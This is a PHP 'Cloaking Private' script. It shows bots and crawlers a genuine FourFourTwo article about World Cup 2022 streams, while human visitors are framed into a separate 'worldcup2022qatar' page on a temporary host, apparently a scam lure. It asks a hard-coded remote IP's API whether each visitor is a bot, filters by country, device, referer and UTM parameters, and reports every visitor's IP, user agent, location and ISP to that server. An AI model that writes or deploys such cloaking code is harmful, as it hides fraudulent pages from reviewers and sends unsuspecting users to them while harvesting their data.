<?php
#########################################################
# THIS SCRIPT GENERATED BY CLOAKING PRIVATE
# @DATE : Thu, 15-12-2022 18:38
##########################################################
# APIKEY SETTING
#########################################################
$CONFIG['APIKEY'] = "fc1ecb33b93610ede3484af8b13f8acd9d9157e1e8c794658014f85733bc12c4";
$CONFIG['ID'] = "485e4a7d82";

/** SETTING CONFIGURATION HERE */
$CONFIG['BOT_PAGE'] = "https://www.fourfourtwo.com/features/how-to-watch-fifa-world-cup-2022-live-streams-qatar"; // WEBSITE DISPLAY FOR BOTS
$CONFIG['REAL_PAGE'] = "http://worldcup2022qatar.j32coepka8-yk26ednmn379.p.temp-site.link/worldcup.php"; // WEBSITE DISPLAY FOR HUMANS

/* Geo filter: Display offer page only to visitors from allowed countries.  */
/* For example, if you enter 'RU,UA' in the next line, system will only allow users from Russia and Ukraine */
$CONFIG['ALLOWED_COUNTRIES'] = ""; // leave empty is allow all countries.

/** Allowed devices: mobile,desktop */
$CONFIG['ALLOWED_DEVICES'] = ""; // leave empty is allow all devices.

/** No reff : block as bot if visitor no referer */
$CONFIG['ALLOW_NOREF'] = false; // true or false

/* UTM parameters forwarding */
/* true - turn on UTM forwarding; */
/* false - disable UTM forwarding */
$CONFIG['ALLOW_UTM'] = false;

/** BLOCKER SETTING */
/* block bad userangent,ip,isp,hostname who detected bot **/
$CONFIG['BLOCK_BOT'] = false;

/** DISPLAY PAGE SETTING */
/* 'meta' - Use meta refresh to redirect visitors. (default method due to maximum compatibility with different hostings) */
/* 'redirect' -  Redirect visitors using 302 header (best method if the goal is maximum transitions).*/
/* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
$CONFIG['BOT_PAGE_METHOD'] = "iframe"; // available method : meta, redirect, iframe
$CONFIG['REAL_PAGE_METHOD'] = "iframe"; // available method : meta, redirect, iframe

define('CONFIG',$CONFIG);

class CloakingPrivate
{
    private $config;
    public $isReal;
    public $isBot;
    private $API_URL;
    private $msg;

    public function __construct()
    {
        $this->config = CONFIG;
        $this->API_URL = "http://103.187.146.171/api";

    }
    public function isUrl($str)
    {
        if (preg_match("/http|https/", $str)) {
            return 'url';
        } elseif (file_exists($str)) {
            return 'file';
        } else {
            exit($str . ' is not a valid url or file');
        }
    }
    public function userIP()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
    public function userAgent()
    {
        return $_SERVER['HTTP_USER_AGENT'];
    }
    public function getStrBetween($split = [] , $string)
    {
        return explode(chr(1),str_replace($split,chr(1),$string));
    }
    public function redirect($method)
    {
        $url = "";
        if ($this->isReal) {
            $url = $this->config['REAL_PAGE'];
        } else {
            $url = $this->config['BOT_PAGE'];
        }

        if ($method == "meta") {
            echo "<meta http-equiv='refresh' content='0; url=" . $url . "'/>";
            exit();
        } elseif ($method == "iframe") {
            
            if($this->isUrl($url) == 'file'){
                $cloak = file_get_contents($url);
            }elseif($this->isUrl($url) == 'url'){
                $cloak = $this->ngecurl($url);
            }else{
                echo "$url : not valid url type or file";
            }
            $head = $this->getStrBetween(['<head>','</head>'] , $cloak);
            echo "<html><head>".@$head[1]."</head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='" . $url . "' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen'></iframe></body></html>";
            exit();
        } elseif ($method == "header") {
            @ob_start();
            @header('HTTP/1.1 302 Moved Temporarily');
            @header('Location: ' . $url);
            @ob_end_flush();
            exit();
        } elseif ($method == "include") {
            if ($this->isUrl($url) == 'file' && file_exists($url)) {
                include $url;
                exit();
            } else {
                echo "$url : File Not Found";
                exit();
            }
        } else {
            echo "Method Not Found";
            exit();
        }
    }
    public function displayAs($method)
    {
        switch ($method) {
            case "meta":
                $this->redirect("meta");
                break;
            case "redirect":
                $this->redirect("header");
                break;
            case "iframe":
                $this->redirect("iframe");
                break;
            case "include":
                $this->redirect("include");
                break;
            default:
                $this->redirect("header");
                break;
        }
    }
    public function ngecurl($url)
    {
        if(function_exists('curl_init')){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, "cloak@" . CONFIG['ID'] . "/" . CONFIG['APIKEY']);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        $output = curl_exec($ch);
        return $output;
        curl_close($ch);
        }else{
        return file_get_contents($url, 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,))));
        }
    }
    public function updateStats($type, $data)
    {
        $api = $this->API_URL . "/stats/" . CONFIG['ID'] . "?type={$type}&data=" . base64_encode($data);
        $result = json_decode($this->ngecurl($api), true);
        if ($result['status'] == 'success') {
            return true;
        } else {
            return false;
        }
    }
    public function getOs()
    {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $os_platform = "Unknown OS Platform";
        $os_array = array(
            '/windows nt 10/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/windows nt 6.0/i' => 'Windows Vista',
            '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' => 'Windows XP',
            '/windows xp/i' => 'Windows XP',
            '/windows nt 5.0/i' => 'Windows 2000',
            '/windows me/i' => 'Windows ME',
            '/win98/i' => 'Windows 98',
            '/win95/i' => 'Windows 95',
            '/win16/i' => 'Windows 3.11',
            '/macintosh|mac os x/i' => 'Mac OS X',
            '/mac_powerpc/i' => 'Mac OS 9',
            '/linux/i' => 'Linux',
            '/ubuntu/i' => 'Ubuntu',
            '/iphone/i' => 'iPhone',
            '/ipod/i' => 'iPod',
            '/ipad/i' => 'iPad',
            '/android/i' => 'Android',
            '/blackberry/i' => 'BlackBerry',
            '/webos/i' => 'Mobile',
        );
        foreach ($os_array as $regex => $value) {
            if (preg_match($regex, $user_agent)) {
                $os_platform = $value;
            }
        }
        return $os_platform;
    }
    public function getDevice()
    {
        $os = $this->getOs();
        $device = "Unknown";
        if (preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i', $os)) {
            $device = "Mobile";
        } elseif (preg_match('/windows|macintosh|linux|ubuntu|mac/i', $os)) {
            $device = "Desktop";
        } else {
            $device = "Unknown";
        }
        return strtolower($device);
    }
    public function isBot()
    {
        $ip = $this->userIP();
        $ua = urlencode($this->userAgent());
        $isBot = $this->ngecurl($this->API_URL . "/blocker?apikey=" . CONFIG['APIKEY'] . "&ip=" . $ip . "&ua=" . $ua);
        $isBot = json_decode($isBot,true);
        if ($isBot['status'] == 'success') {
            if ($isBot['is_bot'] == true) {
                return $isBot;
            } else {
                return false;
            }
        }
    }
    public function ipInfo()
    {
        $ip = $this->userIP();
        if (isset($_COOKIE['userdata'])) {
            return json_decode($_COOKIE['userdata'],true);
        } else {
            $ipinfoCurl = $this->ngecurl("http://ip-api.com/json/".$ip);
            $ipinfo = json_decode($ipinfoCurl, true);
            if ($ipinfo['status'] == 'success') {
                setcookie('userdata', json_encode($ipinfo));
                return $ipinfo;
            } else {
                $re = $this->API_URL . "/ipinfo?apikey=" . CONFIG['APIKEY'] . "&ip=" . $ip;
            $req = $this->ngecurl($re);
            $ipInfo = json_decode($req, true);
            setcookie('userdata', $req);
            if ($ipInfo['status'] == 'success') {
                return $ipInfo;
            } elseif ($ipInfo['status'] == 'error') {
                exit($ipInfo['msg']);
            } else {
                return false; 
                }
            }
           
        }
    }
    public function userdata($data = [], $typeVisitor = 'real', $msg = 'no-message')
    {
        if ($typeVisitor == 'real') {
            $is_bot = 'false';
            $is_real = 'true';
        } else {
            $is_bot = 'true';
            $is_real = 'false';
        }
        return [
            'ip' => $this->userIP(),
            'ua' => $this->userAgent(),
            'device' => $this->getDevice(),
            'os' => $this->getOs(),
            'country' => $data['country'],
            'countryCode' => $data['countryCode'],
            'city' => $data['city'],
            'region' => $data['regionName'],
            'timezone' => $data['timezone'],
            'isp' => $data['isp'],
            'referer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'no-referer',
            'query' => isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : 'no-query',
            'is_bot' => $is_bot,
            'is_real' => $is_real,
            'msg' => $msg,
        ];
    }
    public function init()
    {

        $this->isReal = true;
        $this->isBot = false;
        $getIpInfo = $this->ipInfo();
        $IPINFO = ($getIpInfo == false) ? die("IPINFO : Error not detected") : $this->ipInfo();
        $ISBOT = $this->isBot();
        

        /** BLOCK BAD BOT */
        if (CONFIG['BLOCK_BOT'] == true) {
            if ($ISBOT !== false) {
                $this->isBot = true;
                $this->isReal = false;
                $this->msg = "BLOCKED BOT : " . $ISBOT['bot']. ' - ' . $ISBOT['type'];
                $this->updateStats('bot', json_encode($this->userdata($IPINFO, 'bot', $this->msg)));
                $this->displayAs(CONFIG['BOT_PAGE_METHOD']);
                exit;
            }
        }
        /** ALLOWED COUNTRIES */
        if (CONFIG['ALLOWED_COUNTRIES'] != "") {
            $allowed_countries = explode(",", strtoupper(CONFIG['ALLOWED_COUNTRIES']));
            if (!in_array($IPINFO['countryCode'], $allowed_countries)) {
                $this->isBot = true;
                $this->isReal = false;
                $this->msg = "BLOCKED : COUNTRY NOT ALLOWED";
                $this->updateStats('bot', json_encode($this->userdata($IPINFO, 'bot', $this->msg)));
                $this->displayAs(CONFIG['BOT_PAGE_METHOD']);
                exit;
            }
        }

        /** ALLOWED DEVICE */
        if (CONFIG['ALLOWED_DEVICES'] != "") {
            $allowed_device = strtolower(CONFIG['ALLOWED_DEVICES']);
            if (strtolower($this->getDevice()) != $allowed_device) {
                $this->isBot = true;
                $this->isReal = false;
                $this->msg = "BLOCKED : DEVICE NOT ALLOWED";
                $this->updateStats('bot', json_encode($this->userdata($IPINFO, 'bot', $this->msg)));
                $this->displayAs(CONFIG['BOT_PAGE_METHOD']);
                exit;
            }
        }

        /** ALLOW NO REFERER */
        if (CONFIG['ALLOW_NOREF'] == false) {
            if (!isset($_SERVER['HTTP_REFERER'])) {
                $this->isBot = true;
                $this->isReal = false;
                $this->msg = "BLOCKED : NO REFERER";
                $this->updateStats('bot', json_encode($this->userdata($IPINFO, 'bot', $this->msg)));
                $this->displayAs(CONFIG['BOT_PAGE_METHOD']);
                exit;
            }
        }

        /** ALLOW UTM SOURCE */
        if (CONFIG['ALLOW_UTM'] == false) {
            if (isset($_GET['utm_source']) || isset($_GET['utm_medium']) || isset($_GET['utm_campaign']) || isset($_GET['utm_term']) || isset($_GET['utm_content'])) {
                $this->isBot = true;
                $this->isReal = false;
                $this->msg = "BLOCKED : UTM PARAMS DETECTED";
                $this->updateStats('bot', json_encode($this->userdata($IPINFO, 'bot', $this->msg)));
                $this->displayAs(CONFIG['BOT_PAGE_METHOD']);
                exit;
            }
        }
        if ($this->isReal) {
            $this->isBot = false;
            $this->msg = "ALLOWED : REAL VISITOR";
            if ($this->updateStats('real', json_encode($this->userdata($IPINFO, 'real', $this->msg)))) {
                $this->displayAs(CONFIG['REAL_PAGE_METHOD']);
            }
            exit;

        }
    }

}

$cloakdb = new CloakingPrivate;
$cloakdb->init();

?>
